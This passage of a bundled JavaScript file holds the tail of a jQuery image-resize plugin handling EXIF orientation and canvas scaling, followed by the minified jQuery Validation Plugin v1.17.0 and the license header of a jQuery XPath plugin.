                4: {90: 5, 180: 2, 270: 7},
                // vertical flip + 90 rotate right
                5: {90: 2, 180: 7, 270: 4},
                // 90 rotate right
                6: {90: 3, 180: 8, 270: 1},
                // horizontal flip + 90 rotate right
                7: {90: 4, 180: 5, 270: 2},
                // 90 rotate left
                8: {90: 1, 180: 6, 270: 3}
            };
            return o[orientation][angle] ? o[orientation][angle] : orientation;
        },
        /**
         * Transform canvas coordination according to specified frame size and orientation
         * Orientation value is from EXIF tag
         */
        transformCoordinate: function(canvas, width, height, orientation) {
            //console.log(width, height);
            switch (orientation) {
                case 5:
                case 6:
                case 7:
                case 8:
                    canvas.width = height;
                    canvas.height = width;
                    break;
                default:
                    canvas.width = width;
                    canvas.height = height;
            }
            var ctx = canvas.getContext('2d');
            switch (orientation) {
                case 1:
                    // nothing
                    break;
                case 2:
                    // horizontal flip
                    ctx.translate(width, 0);
                    ctx.scale(-1, 1);
                    break;
                case 3:
                    // 180 rotate left
                    ctx.translate(width, height);
                    ctx.rotate(Math.PI);
                    break;
                case 4:
                    // vertical flip
                    ctx.translate(0, height);
                    ctx.scale(1, -1);
                    break;
                case 5:
                    // vertical flip + 90 rotate right
                    ctx.rotate(0.5 * Math.PI);
                    ctx.scale(1, -1);
                    break;
                case 6:
                    // 90 rotate right
                    ctx.rotate(0.5 * Math.PI);
                    ctx.translate(0, -height);
                    break;
                case 7:
                    // horizontal flip + 90 rotate right
                    ctx.rotate(0.5 * Math.PI);
                    ctx.translate(width, -height);
                    ctx.scale(-1, 1);
                    break;
                case 8:
                    // 90 rotate left
                    ctx.rotate(-0.5 * Math.PI);
                    ctx.translate(-width, 0);
                    break;
                default:
                    break;
            }
        },
        /**
         * Detecting vertical squash in loaded image.
         * Fixes a bug which squash image vertically while drawing into canvas for some images.
         */
        detectVerticalSquash: function(img, iw, ih) {
            var canvas = document.createElement('canvas');
            canvas.width = 1;
            canvas.height = ih;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0);
            var data = ctx.getImageData(0, 0, 1, ih).data;
            // search image edge pixel position in case it is squashed vertically.
            var sy = 0;
            var ey = ih;
            var py = ih;
            while (py > sy) {
                var alpha = data[(py - 1) * 4 + 3];
                if (alpha === 0) {
                    ey = py;
                } else {
                    sy = py;
                }
                py = (ey + sy) >> 1;
            }
            var ratio = py / ih;
            return ratio === 0 ? 1 : ratio;
        },
        callback: function(d) {
            return d;
        }
    },
    defaults = {
        width: 300,
        height: 0,
        crop: false,
        quality: 80,
        'callback': methods.callback
    };
    function Plugin(file, options) {
        this.file = file;
        this.options = $.extend({}, defaults, options);
        this._defaults = defaults;
        this._name = pluginName;
        this.init();
    }
    Plugin.prototype = {
        init: function() {
            //this.options.init(this);
            var $this = this;
            var file = this.file;

            var reader = new FileReader();
            reader.onloadend = function(e) {
                var dataURL = e.target.result;
                var img = new Image();
                img.onload = function(e) {
                    // Read Orientation Data in EXIF
                    $(img).exifLoadFromDataURL(function() {
                        var orientation = $(img).exif('Orientation')[0] || 1;
                        orientation = methods.rotate(orientation, $this.options.rotate);

                        // CW or CCW ? replace width and height
                        var size = (orientation >= 5 && orientation <= 8)
                                ? methods.newsize(img.height, img.width, $this.options.width, $this.options.height, $this.options.crop)
                                : methods.newsize(img.width, img.height, $this.options.width, $this.options.height, $this.options.crop);

                        var iw = img.width, ih = img.height;
                        var width = size.width, height = size.height;

                        //console.log(iw, ih, size.width, size.height, orientation);

                        var canvas = document.createElement("canvas");
                        var ctx = canvas.getContext("2d");
                        ctx.save();
                        methods.transformCoordinate(canvas, width, height, orientation);

                        // over image size
                        if (methods.detectSubsampling(img)) {
                            iw /= 2;
                            ih /= 2;
                        }
                        var d = 1024; // size of tiling canvas
                        var tmpCanvas = document.createElement('canvas');
                        tmpCanvas.width = tmpCanvas.height = d;
                        var tmpCtx = tmpCanvas.getContext('2d');
                        var vertSquashRatio = methods.detectVerticalSquash(img, iw, ih);
                        var sy = 0;
                        while (sy < ih) {
                            var sh = sy + d > ih ? ih - sy : d;
                            var sx = 0;
                            while (sx < iw) {
                                var sw = sx + d > iw ? iw - sx : d;
                                tmpCtx.clearRect(0, 0, d, d);
                                tmpCtx.drawImage(img, -sx, -sy);
                                var dx = Math.floor(sx * width / iw);
                                var dw = Math.ceil(sw * width / iw);
                                var dy = Math.floor(sy * height / ih / vertSquashRatio);
                                var dh = Math.ceil(sh * height / ih / vertSquashRatio);
                                ctx.drawImage(tmpCanvas, 0, 0, sw, sh, dx, dy, dw, dh);
                                sx += d;
                            }
                            sy += d;
                        }
                        ctx.restore();
                        tmpCanvas = tmpCtx = null;

                        // if cropped or rotated width and height data replacing issue
                        var newcanvas = document.createElement('canvas');
                        newcanvas.width = size.cropped === 'h' ? height : width;
                        newcanvas.height = size.cropped === 'w' ? width : height;
                        var x = size.cropped === 'h' ? (height - width) * .5 : 0;
                        var y = size.cropped === 'w' ? (width - height) * .5 : 0;
                        newctx = newcanvas.getContext('2d');
                        newctx.drawImage(canvas, x, y, width, height);

                        if (file.type === "image/png") {
                            var data = newcanvas.toDataURL(file.type);
                        } else {
                            var data = newcanvas.toDataURL("image/jpeg", ($this.options.quality * .01));
                        }

                        // CALLBACK
                        $this.options.callback(data, width, height);

                    });
                };
                img.src = dataURL;
                // =====================================================
            };
            reader.readAsDataURL(file);

        }
    };
    $[pluginName] = function(file, options) {
        if (typeof file === 'string')
            return methods[file](options);
        else
            new Plugin(file, options);
    };

})(jQuery);










/*! jQuery Validation Plugin - v1.17.0 - 7/29/2017
 * https://jqueryvalidation.org/
 * Copyright (c) 2017 Jörn Zaefferer; Licensed MIT */
!function(a){"function"==typeof define&&define.amd?define(["jquery"],a):"object"==typeof module&&module.exports?module.exports=a(require("jquery")):a(jQuery)}(function(a){a.extend(a.fn,{validate:function(b){if(!this.length)return void(b&&b.debug&&window.console&&console.warn("Nothing selected, can't validate, returning nothing."));var c=a.data(this[0],"validator");return c?c:(this.attr("novalidate","novalidate"),c=new a.validator(b,this[0]),a.data(this[0],"validator",c),c.settings.onsubmit&&(this.on("click.validate",":submit",function(b){c.submitButton=b.currentTarget,a(this).hasClass("cancel")&&(c.cancelSubmit=!0),void 0!==a(this).attr("formnovalidate")&&(c.cancelSubmit=!0)}),this.on("submit.validate",function(b){function d(){var d,e;return c.submitButton&&(c.settings.submitHandler||c.formSubmitted)&&(d=a("<input type='hidden'/>").attr("name",c.submitButton.name).val(a(c.submitButton).val()).appendTo(c.currentForm)),!c.settings.submitHandler||(e=c.settings.submitHandler.call(c,c.currentForm,b),d&&d.remove(),void 0!==e&&e)}return c.settings.debug&&b.preventDefault(),c.cancelSubmit?(c.cancelSubmit=!1,d()):c.form()?c.pendingRequest?(c.formSubmitted=!0,!1):d():(c.focusInvalid(),!1)})),c)},valid:function(){var b,c,d;return a(this[0]).is("form")?b=this.validate().form():(d=[],b=!0,c=a(this[0].form).validate(),this.each(function(){b=c.element(this)&&b,b||(d=d.concat(c.errorList))}),c.errorList=d),b},rules:function(b,c){var d,e,f,g,h,i,j=this[0];if(null!=j&&(!j.form&&j.hasAttribute("contenteditable")&&(j.form=this.closest("form")[0],j.name=this.attr("name")),null!=j.form)){if(b)switch(d=a.data(j.form,"validator").settings,e=d.rules,f=a.validator.staticRules(j),b){case"add":a.extend(f,a.validator.normalizeRule(c)),delete f.messages,e[j.name]=f,c.messages&&(d.messages[j.name]=a.extend(d.messages[j.name],c.messages));break;case"remove":return c?(i={},a.each(c.split(/\s/),function(a,b){i[b]=f[b],delete f[b]}),i):(delete e[j.name],f)}return g=a.validator.normalizeRules(a.extend({},a.validator.classRules(j),a.validator.attributeRules(j),a.validator.dataRules(j),a.validator.staticRules(j)),j),g.required&&(h=g.required,delete g.required,g=a.extend({required:h},g)),g.remote&&(h=g.remote,delete g.remote,g=a.extend(g,{remote:h})),g}}}),a.extend(a.expr.pseudos||a.expr[":"],{blank:function(b){return!a.trim(""+a(b).val())},filled:function(b){var c=a(b).val();return null!==c&&!!a.trim(""+c)},unchecked:function(b){return!a(b).prop("checked")}}),a.validator=function(b,c){this.settings=a.extend(!0,{},a.validator.defaults,b),this.currentForm=c,this.init()},a.validator.format=function(b,c){return 1===arguments.length?function(){var c=a.makeArray(arguments);return c.unshift(b),a.validator.format.apply(this,c)}:void 0===c?b:(arguments.length>2&&c.constructor!==Array&&(c=a.makeArray(arguments).slice(1)),c.constructor!==Array&&(c=[c]),a.each(c,function(a,c){b=b.replace(new RegExp("\\{"+a+"\\}","g"),function(){return c})}),b)},a.extend(a.validator,{defaults:{messages:{},groups:{},rules:{},errorClass:"error",pendingClass:"pending",validClass:"valid",errorElement:"label",focusCleanup:!1,focusInvalid:!0,errorContainer:a([]),errorLabelContainer:a([]),onsubmit:!0,ignore:":hidden",ignoreTitle:!1,onfocusin:function(a){this.lastActive=a,this.settings.focusCleanup&&(this.settings.unhighlight&&this.settings.unhighlight.call(this,a,this.settings.errorClass,this.settings.validClass),this.hideThese(this.errorsFor(a)))},onfocusout:function(a){this.checkable(a)||!(a.name in this.submitted)&&this.optional(a)||this.element(a)},onkeyup:function(b,c){var d=[16,17,18,20,35,36,37,38,39,40,45,144,225];9===c.which&&""===this.elementValue(b)||a.inArray(c.keyCode,d)!==-1||(b.name in this.submitted||b.name in this.invalid)&&this.element(b)},onclick:function(a){a.name in this.submitted?this.element(a):a.parentNode.name in this.submitted&&this.element(a.parentNode)},highlight:function(b,c,d){"radio"===b.type?this.findByName(b.name).addClass(c).removeClass(d):a(b).addClass(c).removeClass(d)},unhighlight:function(b,c,d){"radio"===b.type?this.findByName(b.name).removeClass(c).addClass(d):a(b).removeClass(c).addClass(d)}},setDefaults:function(b){a.extend(a.validator.defaults,b)},messages:{required:"This field is required.",remote:"Please fix this field.",email:"Please enter a valid email address.",url:"Please enter a valid URL.",date:"Please enter a valid date.",dateISO:"Please enter a valid date (ISO).",number:"Please enter a valid number.",digits:"Please enter only digits.",equalTo:"Please enter the same value again.",maxlength:a.validator.format("Please enter no more than {0} characters."),minlength:a.validator.format("Please enter at least {0} characters."),rangelength:a.validator.format("Please enter a value between {0} and {1} characters long."),range:a.validator.format("Please enter a value between {0} and {1}."),max:a.validator.format("Please enter a value less than or equal to {0}."),min:a.validator.format("Please enter a value greater than or equal to {0}."),step:a.validator.format("Please enter a multiple of {0}.")},autoCreateRanges:!1,prototype:{init:function(){function b(b){!this.form&&this.hasAttribute("contenteditable")&&(this.form=a(this).closest("form")[0],this.name=a(this).attr("name"));var c=a.data(this.form,"validator"),d="on"+b.type.replace(/^validate/,""),e=c.settings;e[d]&&!a(this).is(e.ignore)&&e[d].call(c,this,b)}this.labelContainer=a(this.settings.errorLabelContainer),this.errorContext=this.labelContainer.length&&this.labelContainer||a(this.currentForm),this.containers=a(this.settings.errorContainer).add(this.settings.errorLabelContainer),this.submitted={},this.valueCache={},this.pendingRequest=0,this.pending={},this.invalid={},this.reset();var c,d=this.groups={};a.each(this.settings.groups,function(b,c){"string"==typeof c&&(c=c.split(/\s/)),a.each(c,function(a,c){d[c]=b})}),c=this.settings.rules,a.each(c,function(b,d){c[b]=a.validator.normalizeRule(d)}),a(this.currentForm).on("focusin.validate focusout.validate keyup.validate",":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'], [type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], [type='radio'], [type='checkbox'], [contenteditable], [type='button']",b).on("click.validate","select, option, [type='radio'], [type='checkbox']",b),this.settings.invalidHandler&&a(this.currentForm).on("invalid-form.validate",this.settings.invalidHandler)},form:function(){return this.checkForm(),a.extend(this.submitted,this.errorMap),this.invalid=a.extend({},this.errorMap),this.valid()||a(this.currentForm).triggerHandler("invalid-form",[this]),this.showErrors(),this.valid()},checkForm:function(){this.prepareForm();for(var a=0,b=this.currentElements=this.elements();b[a];a++)this.check(b[a]);return this.valid()},element:function(b){var c,d,e=this.clean(b),f=this.validationTargetFor(e),g=this,h=!0;return void 0===f?delete this.invalid[e.name]:(this.prepareElement(f),this.currentElements=a(f),d=this.groups[f.name],d&&a.each(this.groups,function(a,b){b===d&&a!==f.name&&(e=g.validationTargetFor(g.clean(g.findByName(a))),e&&e.name in g.invalid&&(g.currentElements.push(e),h=g.check(e)&&h))}),c=this.check(f)!==!1,h=h&&c,c?this.invalid[f.name]=!1:this.invalid[f.name]=!0,this.numberOfInvalids()||(this.toHide=this.toHide.add(this.containers)),this.showErrors(),a(b).attr("aria-invalid",!c)),h},showErrors:function(b){if(b){var c=this;a.extend(this.errorMap,b),this.errorList=a.map(this.errorMap,function(a,b){return{message:a,element:c.findByName(b)[0]}}),this.successList=a.grep(this.successList,function(a){return!(a.name in b)})}this.settings.showErrors?this.settings.showErrors.call(this,this.errorMap,this.errorList):this.defaultShowErrors()},resetForm:function(){a.fn.resetForm&&a(this.currentForm).resetForm(),this.invalid={},this.submitted={},this.prepareForm(),this.hideErrors();var b=this.elements().removeData("previousValue").removeAttr("aria-invalid");this.resetElements(b)},resetElements:function(a){var b;if(this.settings.unhighlight)for(b=0;a[b];b++)this.settings.unhighlight.call(this,a[b],this.settings.errorClass,""),this.findByName(a[b].name).removeClass(this.settings.validClass);else a.removeClass(this.settings.errorClass).removeClass(this.settings.validClass)},numberOfInvalids:function(){return this.objectLength(this.invalid)},objectLength:function(a){var b,c=0;for(b in a)void 0!==a[b]&&null!==a[b]&&a[b]!==!1&&c++;return c},hideErrors:function(){this.hideThese(this.toHide)},hideThese:function(a){a.not(this.containers).text(""),this.addWrapper(a).hide()},valid:function(){return 0===this.size()},size:function(){return this.errorList.length},focusInvalid:function(){if(this.settings.focusInvalid)try{a(this.findLastActive()||this.errorList.length&&this.errorList[0].element||[]).filter(":visible").focus().trigger("focusin")}catch(b){}},findLastActive:function(){var b=this.lastActive;return b&&1===a.grep(this.errorList,function(a){return a.element.name===b.name}).length&&b},elements:function(){var b=this,c={};return a(this.currentForm).find("input, select, textarea, [contenteditable]").not(":submit, :reset, :image, :disabled").not(this.settings.ignore).filter(function(){var d=this.name||a(this).attr("name");return!d&&b.settings.debug&&window.console&&console.error("%o has no name assigned",this),this.hasAttribute("contenteditable")&&(this.form=a(this).closest("form")[0],this.name=d),!(d in c||!b.objectLength(a(this).rules()))&&(c[d]=!0,!0)})},clean:function(b){return a(b)[0]},errors:function(){var b=this.settings.errorClass.split(" ").join(".");return a(this.settings.errorElement+"."+b,this.errorContext)},resetInternals:function(){this.successList=[],this.errorList=[],this.errorMap={},this.toShow=a([]),this.toHide=a([])},reset:function(){this.resetInternals(),this.currentElements=a([])},prepareForm:function(){this.reset(),this.toHide=this.errors().add(this.containers)},prepareElement:function(a){this.reset(),this.toHide=this.errorsFor(a)},elementValue:function(b){var c,d,e=a(b),f=b.type;return"radio"===f||"checkbox"===f?this.findByName(b.name).filter(":checked").val():"number"===f&&"undefined"!=typeof b.validity?b.validity.badInput?"NaN":e.val():(c=b.hasAttribute("contenteditable")?e.text():e.val(),"file"===f?"C:\\fakepath\\"===c.substr(0,12)?c.substr(12):(d=c.lastIndexOf("/"),d>=0?c.substr(d+1):(d=c.lastIndexOf("\\"),d>=0?c.substr(d+1):c)):"string"==typeof c?c.replace(/\r/g,""):c)},check:function(b){b=this.validationTargetFor(this.clean(b));var c,d,e,f,g=a(b).rules(),h=a.map(g,function(a,b){return b}).length,i=!1,j=this.elementValue(b);if("function"==typeof g.normalizer?f=g.normalizer:"function"==typeof this.settings.normalizer&&(f=this.settings.normalizer),f){if(j=f.call(b,j),"string"!=typeof j)throw new TypeError("The normalizer should return a string value.");delete g.normalizer}for(d in g){e={method:d,parameters:g[d]};try{if(c=a.validator.methods[d].call(this,j,b,e.parameters),"dependency-mismatch"===c&&1===h){i=!0;continue}if(i=!1,"pending"===c)return void(this.toHide=this.toHide.not(this.errorsFor(b)));if(!c)return this.formatAndAdd(b,e),!1}catch(k){throw this.settings.debug&&window.console&&console.log("Exception occurred when checking element "+b.id+", check the '"+e.method+"' method.",k),k instanceof TypeError&&(k.message+=".  Exception occurred when checking element "+b.id+", check the '"+e.method+"' method."),k}}if(!i)return this.objectLength(g)&&this.successList.push(b),!0},customDataMessage:function(b,c){return a(b).data("msg"+c.charAt(0).toUpperCase()+c.substring(1).toLowerCase())||a(b).data("msg")},customMessage:function(a,b){var c=this.settings.messages[a];return c&&(c.constructor===String?c:c[b])},findDefined:function(){for(var a=0;a<arguments.length;a++)if(void 0!==arguments[a])return arguments[a]},defaultMessage:function(b,c){"string"==typeof c&&(c={method:c});var d=this.findDefined(this.customMessage(b.name,c.method),this.customDataMessage(b,c.method),!this.settings.ignoreTitle&&b.title||void 0,a.validator.messages[c.method],"<strong>Warning: No message defined for "+b.name+"</strong>"),e=/\$?\{(\d+)\}/g;return"function"==typeof d?d=d.call(this,c.parameters,b):e.test(d)&&(d=a.validator.format(d.replace(e,"{$1}"),c.parameters)),d},formatAndAdd:function(a,b){var c=this.defaultMessage(a,b);this.errorList.push({message:c,element:a,method:b.method}),this.errorMap[a.name]=c,this.submitted[a.name]=c},addWrapper:function(a){return this.settings.wrapper&&(a=a.add(a.parent(this.settings.wrapper))),a},defaultShowErrors:function(){var a,b,c;for(a=0;this.errorList[a];a++)c=this.errorList[a],this.settings.highlight&&this.settings.highlight.call(this,c.element,this.settings.errorClass,this.settings.validClass),this.showLabel(c.element,c.message);if(this.errorList.length&&(this.toShow=this.toShow.add(this.containers)),this.settings.success)for(a=0;this.successList[a];a++)this.showLabel(this.successList[a]);if(this.settings.unhighlight)for(a=0,b=this.validElements();b[a];a++)this.settings.unhighlight.call(this,b[a],this.settings.errorClass,this.settings.validClass);this.toHide=this.toHide.not(this.toShow),this.hideErrors(),this.addWrapper(this.toShow).show()},validElements:function(){return this.currentElements.not(this.invalidElements())},invalidElements:function(){return a(this.errorList).map(function(){return this.element})},showLabel:function(b,c){var d,e,f,g,h=this.errorsFor(b),i=this.idOrName(b),j=a(b).attr("aria-describedby");h.length?(h.removeClass(this.settings.validClass).addClass(this.settings.errorClass),h.html(c)):(h=a("<"+this.settings.errorElement+">").attr("id",i+"-error").addClass(this.settings.errorClass).html(c||""),d=h,this.settings.wrapper&&(d=h.hide().show().wrap("<"+this.settings.wrapper+"/>").parent()),this.labelContainer.length?this.labelContainer.append(d):this.settings.errorPlacement?this.settings.errorPlacement.call(this,d,a(b)):d.insertAfter(b),h.is("label")?h.attr("for",i):0===h.parents("label[for='"+this.escapeCssMeta(i)+"']").length&&(f=h.attr("id"),j?j.match(new RegExp("\\b"+this.escapeCssMeta(f)+"\\b"))||(j+=" "+f):j=f,a(b).attr("aria-describedby",j),e=this.groups[b.name],e&&(g=this,a.each(g.groups,function(b,c){c===e&&a("[name='"+g.escapeCssMeta(b)+"']",g.currentForm).attr("aria-describedby",h.attr("id"))})))),!c&&this.settings.success&&(h.text(""),"string"==typeof this.settings.success?h.addClass(this.settings.success):this.settings.success(h,b)),this.toShow=this.toShow.add(h)},errorsFor:function(b){var c=this.escapeCssMeta(this.idOrName(b)),d=a(b).attr("aria-describedby"),e="label[for='"+c+"'], label[for='"+c+"'] *";return d&&(e=e+", #"+this.escapeCssMeta(d).replace(/\s+/g,", #")),this.errors().filter(e)},escapeCssMeta:function(a){return a.replace(/([\\!"#$%&'()*+,.\/:;<=>?@\[\]^`{|}~])/g,"\\$1")},idOrName:function(a){return this.groups[a.name]||(this.checkable(a)?a.name:a.id||a.name)},validationTargetFor:function(b){return this.checkable(b)&&(b=this.findByName(b.name)),a(b).not(this.settings.ignore)[0]},checkable:function(a){return/radio|checkbox/i.test(a.type)},findByName:function(b){return a(this.currentForm).find("[name='"+this.escapeCssMeta(b)+"']")},getLength:function(b,c){switch(c.nodeName.toLowerCase()){case"select":return a("option:selected",c).length;case"input":if(this.checkable(c))return this.findByName(c.name).filter(":checked").length}return b.length},depend:function(a,b){return!this.dependTypes[typeof a]||this.dependTypes[typeof a](a,b)},dependTypes:{"boolean":function(a){return a},string:function(b,c){return!!a(b,c.form).length},"function":function(a,b){return a(b)}},optional:function(b){var c=this.elementValue(b);return!a.validator.methods.required.call(this,c,b)&&"dependency-mismatch"},startRequest:function(b){this.pending[b.name]||(this.pendingRequest++,a(b).addClass(this.settings.pendingClass),this.pending[b.name]=!0)},stopRequest:function(b,c){this.pendingRequest--,this.pendingRequest<0&&(this.pendingRequest=0),delete this.pending[b.name],a(b).removeClass(this.settings.pendingClass),c&&0===this.pendingRequest&&this.formSubmitted&&this.form()?(a(this.currentForm).submit(),this.submitButton&&a("input:hidden[name='"+this.submitButton.name+"']",this.currentForm).remove(),this.formSubmitted=!1):!c&&0===this.pendingRequest&&this.formSubmitted&&(a(this.currentForm).triggerHandler("invalid-form",[this]),this.formSubmitted=!1)},previousValue:function(b,c){return c="string"==typeof c&&c||"remote",a.data(b,"previousValue")||a.data(b,"previousValue",{old:null,valid:!0,message:this.defaultMessage(b,{method:c})})},destroy:function(){this.resetForm(),a(this.currentForm).off(".validate").removeData("validator").find(".validate-equalTo-blur").off(".validate-equalTo").removeClass("validate-equalTo-blur")}},classRuleSettings:{required:{required:!0},email:{email:!0},url:{url:!0},date:{date:!0},dateISO:{dateISO:!0},number:{number:!0},digits:{digits:!0},creditcard:{creditcard:!0}},addClassRules:function(b,c){b.constructor===String?this.classRuleSettings[b]=c:a.extend(this.classRuleSettings,b)},classRules:function(b){var c={},d=a(b).attr("class");return d&&a.each(d.split(" "),function(){this in a.validator.classRuleSettings&&a.extend(c,a.validator.classRuleSettings[this])}),c},normalizeAttributeRule:function(a,b,c,d){/min|max|step/.test(c)&&(null===b||/number|range|text/.test(b))&&(d=Number(d),isNaN(d)&&(d=void 0)),d||0===d?a[c]=d:b===c&&"range"!==b&&(a[c]=!0)},attributeRules:function(b){var c,d,e={},f=a(b),g=b.getAttribute("type");for(c in a.validator.methods)"required"===c?(d=b.getAttribute(c),""===d&&(d=!0),d=!!d):d=f.attr(c),this.normalizeAttributeRule(e,g,c,d);return e.maxlength&&/-1|2147483647|524288/.test(e.maxlength)&&delete e.maxlength,e},dataRules:function(b){var c,d,e={},f=a(b),g=b.getAttribute("type");for(c in a.validator.methods)d=f.data("rule"+c.charAt(0).toUpperCase()+c.substring(1).toLowerCase()),this.normalizeAttributeRule(e,g,c,d);return e},staticRules:function(b){var c={},d=a.data(b.form,"validator");return d.settings.rules&&(c=a.validator.normalizeRule(d.settings.rules[b.name])||{}),c},normalizeRules:function(b,c){return a.each(b,function(d,e){if(e===!1)return void delete b[d];if(e.param||e.depends){var f=!0;switch(typeof e.depends){case"string":f=!!a(e.depends,c.form).length;break;case"function":f=e.depends.call(c,c)}f?b[d]=void 0===e.param||e.param:(a.data(c.form,"validator").resetElements(a(c)),delete b[d])}}),a.each(b,function(d,e){b[d]=a.isFunction(e)&&"normalizer"!==d?e(c):e}),a.each(["minlength","maxlength"],function(){b[this]&&(b[this]=Number(b[this]))}),a.each(["rangelength","range"],function(){var c;b[this]&&(a.isArray(b[this])?b[this]=[Number(b[this][0]),Number(b[this][1])]:"string"==typeof b[this]&&(c=b[this].replace(/[\[\]]/g,"").split(/[\s,]+/),b[this]=[Number(c[0]),Number(c[1])]))}),a.validator.autoCreateRanges&&(null!=b.min&&null!=b.max&&(b.range=[b.min,b.max],delete b.min,delete b.max),null!=b.minlength&&null!=b.maxlength&&(b.rangelength=[b.minlength,b.maxlength],delete b.minlength,delete b.maxlength)),b},normalizeRule:function(b){if("string"==typeof b){var c={};a.each(b.split(/\s/),function(){c[this]=!0}),b=c}return b},addMethod:function(b,c,d){a.validator.methods[b]=c,a.validator.messages[b]=void 0!==d?d:a.validator.messages[b],c.length<3&&a.validator.addClassRules(b,a.validator.normalizeRule(b))},methods:{required:function(b,c,d){if(!this.depend(d,c))return"dependency-mismatch";if("select"===c.nodeName.toLowerCase()){var e=a(c).val();return e&&e.length>0}return this.checkable(c)?this.getLength(b,c)>0:b.length>0},email:function(a,b){return this.optional(b)||/^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(a)},url:function(a,b){return this.optional(b)||/^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[\/?#]\S*)?$/i.test(a)},date:function(a,b){return this.optional(b)||!/Invalid|NaN/.test(new Date(a).toString())},dateISO:function(a,b){return this.optional(b)||/^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test(a)},number:function(a,b){return this.optional(b)||/^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(a)},digits:function(a,b){return this.optional(b)||/^\d+$/.test(a)},minlength:function(b,c,d){var e=a.isArray(b)?b.length:this.getLength(b,c);return this.optional(c)||e>=d},maxlength:function(b,c,d){var e=a.isArray(b)?b.length:this.getLength(b,c);return this.optional(c)||e<=d},rangelength:function(b,c,d){var e=a.isArray(b)?b.length:this.getLength(b,c);return this.optional(c)||e>=d[0]&&e<=d[1]},min:function(a,b,c){return this.optional(b)||a>=c},max:function(a,b,c){return this.optional(b)||a<=c},range:function(a,b,c){return this.optional(b)||a>=c[0]&&a<=c[1]},step:function(b,c,d){var e,f=a(c).attr("type"),g="Step attribute on input type "+f+" is not supported.",h=["text","number","range"],i=new RegExp("\\b"+f+"\\b"),j=f&&!i.test(h.join()),k=function(a){var b=(""+a).match(/(?:\.(\d+))?$/);return b&&b[1]?b[1].length:0},l=function(a){return Math.round(a*Math.pow(10,e))},m=!0;if(j)throw new Error(g);return e=k(d),(k(b)>e||l(b)%l(d)!==0)&&(m=!1),this.optional(c)||m},equalTo:function(b,c,d){var e=a(d);return this.settings.onfocusout&&e.not(".validate-equalTo-blur").length&&e.addClass("validate-equalTo-blur").on("blur.validate-equalTo",function(){a(c).valid()}),b===e.val()},remote:function(b,c,d,e){if(this.optional(c))return"dependency-mismatch";e="string"==typeof e&&e||"remote";var f,g,h,i=this.previousValue(c,e);return this.settings.messages[c.name]||(this.settings.messages[c.name]={}),i.originalMessage=i.originalMessage||this.settings.messages[c.name][e],this.settings.messages[c.name][e]=i.message,d="string"==typeof d&&{url:d}||d,h=a.param(a.extend({data:b},d.data)),i.old===h?i.valid:(i.old=h,f=this,this.startRequest(c),g={},g[c.name]=b,a.ajax(a.extend(!0,{mode:"abort",port:"validate"+c.name,dataType:"json",data:g,context:f.currentForm,success:function(a){var d,g,h,j=a===!0||"true"===a;f.settings.messages[c.name][e]=i.originalMessage,j?(h=f.formSubmitted,f.resetInternals(),f.toHide=f.errorsFor(c),f.formSubmitted=h,f.successList.push(c),f.invalid[c.name]=!1,f.showErrors()):(d={},g=a||f.defaultMessage(c,{method:e,parameters:b}),d[c.name]=i.message=g,f.invalid[c.name]=!0,f.showErrors(d)),i.valid=j,f.stopRequest(c,j)}},d)),"pending")}}});var b,c={};return a.ajaxPrefilter?a.ajaxPrefilter(function(a,b,d){var e=a.port;"abort"===a.mode&&(c[e]&&c[e].abort(),c[e]=d)}):(b=a.ajax,a.ajax=function(d){var e=("mode"in d?d:a.ajaxSettings).mode,f=("port"in d?d:a.ajaxSettings).port;return"abort"===e?(c[f]&&c[f].abort(),c[f]=b.apply(this,arguments),c[f]):b.apply(this,arguments)}),a});





/*
 * jQuery XPath plugin v0.3.1
 * https://github.com/ilinsky/jquery-xpath
 * Copyright 2015, Sergey Ilinsky
 * Dual licensed under the MIT and GPL licenses.
 *
 * Includes xpath.js - XPath 2.0 implementation in JavaScript
 * https://github.com/ilinsky/xpath.js
 * Copyright 2015, Sergey Ilinsky
 * Dual licensed under the MIT and GPL licenses.
 *
 */
